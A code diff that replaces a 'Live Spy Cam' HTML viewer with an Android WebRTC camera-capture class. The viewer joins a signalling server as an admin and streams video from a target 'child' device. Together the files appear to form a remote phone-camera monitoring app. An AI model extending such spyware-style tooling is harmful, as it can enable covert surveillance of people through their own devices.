@@ -1,97 +1,52 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Camera Monitor</title>
-    <style>
-        body { font-family: sans-serif; background: #111; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        h2 { margin-bottom: 10px; color: #00d2ff; }
-        video { width: 90%; max-width: 600px; border: 2px solid #333; border-radius: 10px; background: black; box-shadow: 0 0 20px rgba(0, 210, 255, 0.2); }
-        .controls { margin-top: 20px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #00d2ff; border: none; border-radius: 5px; color: #000; font-weight: bold; }
-        button:hover { background: #00aacc; }
-        #status { margin-top: 10px; font-size: 14px; color: #aaa; }
-    </style>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-</head>
-<body>
+package com.example.childapp;
 
-    <h2>🎥 Live Spy Cam</h2>
-    <video id="remoteVideo" autoplay playsinline></video>
-    
-    <div class="controls">
-        <button onclick="switchCamera()">🔄 Switch Camera (Front/Back)</button>
-    </div>
-    <div id="status">Waiting for connection...</div>
+import android.content.Context;
+import org.webrtc.Camera2Enumerator;
+import org.webrtc.CameraVideoCapturer;
+import org.webrtc.SurfaceTextureHelper;
+import org.webrtc.VideoCapturer;
 
-    <script>
-        const socket = io("https://child-v9no.onrender.com"); // ✅ Tumhara Server
-        const remoteVideo = document.getElementById("remoteVideo");
-        const statusText = document.getElementById("status");
+public class MyCameraManager {
+    private Context context;
+    private CameraVideoCapturer cameraCapturer;
 
-        let peerConnection;
-        const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
-        
-        // Target Device ID (Jo App me dala hai wahi yaha hona chahiye)
-        const TARGET_DEVICE = "CHILD_DEVICE_1"; 
+    public MyCameraManager(Context context) {
+        this.context = context;
+    }
 
-        socket.on("connect", () => {
-            statusText.innerText = "✅ Connected to Server. Joining as ADMIN...";
-            socket.emit("join-room", "ADMIN");
-        });
+    public VideoCapturer createCameraCapturer(SurfaceTextureHelper helper) {
+        Camera2Enumerator enumerator = new Camera2Enumerator(context);
+        final String[] deviceNames = enumerator.getDeviceNames();
 
-        // 1. Offer Recieved from Mobile
-        socket.on("offer", async (data) => {
-            statusText.innerText = "📩 Incoming Stream...";
-            
-            peerConnection = new RTCPeerConnection(config);
-            
-            peerConnection.ontrack = (event) => {
-                remoteVideo.srcObject = event.streams[0];
-                statusText.innerText = "🔴 Live Streaming";
-            };
-
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    socket.emit("candidate", {
-                        target: TARGET_DEVICE,
-                        type: "candidate",
-                        candidate: event.candidate.candidate,
-                        sdpMid: event.candidate.sdpMid,
-                        sdpMLineIndex: event.candidate.sdpMLineIndex
-                    });
-                }
-            };
-
-            await peerConnection.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
-            const answer = await peerConnection.createAnswer();
-            await peerConnection.setLocalDescription(answer);
-
-            socket.emit("answer", {
-                target: TARGET_DEVICE,
-                type: "answer",
-                sdp: answer.sdp
-            });
-        });
-
-        // 2. ICE Candidates Handling
-        socket.on("candidate", (data) => {
-            if (peerConnection) {
-                peerConnection.addIceCandidate(new RTCIceCandidate({
-                    candidate: data.candidate,
-                    sdpMid: data.sdpMid,
-                    sdpMLineIndex: data.sdpMLineIndex
-                }));
+        // 1. Pehle Front Camera Try karo
+        for (String deviceName : deviceNames) {
+            if (enumerator.isFrontFacing(deviceName)) {
+                cameraCapturer = enumerator.createCapturer(deviceName, null);
+                if (cameraCapturer != null) return cameraCapturer;
             }
-        });
-
-        // 🔥 Send Switch Camera Command
-        function switchCamera() {
-            statusText.innerText = "🔄 Sending Switch Command...";
-            socket.emit("switch-camera", { target: TARGET_DEVICE });
         }
-    </script>
 
-</body>
-</html>
+        // 2. Agar Front nahi mila to Back Camera lo
+        for (String deviceName : deviceNames) {
+            if (enumerator.isBackFacing(deviceName)) {
+                cameraCapturer = enumerator.createCapturer(deviceName, null);
+                if (cameraCapturer != null) return cameraCapturer;
+            }
+        }
+        return null;
+    }
+
+    // Camera Switch karne ka function
+    public void switchCamera() {
+        if (cameraCapturer != null) {
+            cameraCapturer.switchCamera(null);
+        }
+    }
+    
+    public void stop() {
+        if(cameraCapturer != null) {
+            try { cameraCapturer.stopCapture(); } catch(Exception e){}
+            cameraCapturer.dispose();
+        }
+    }
+}
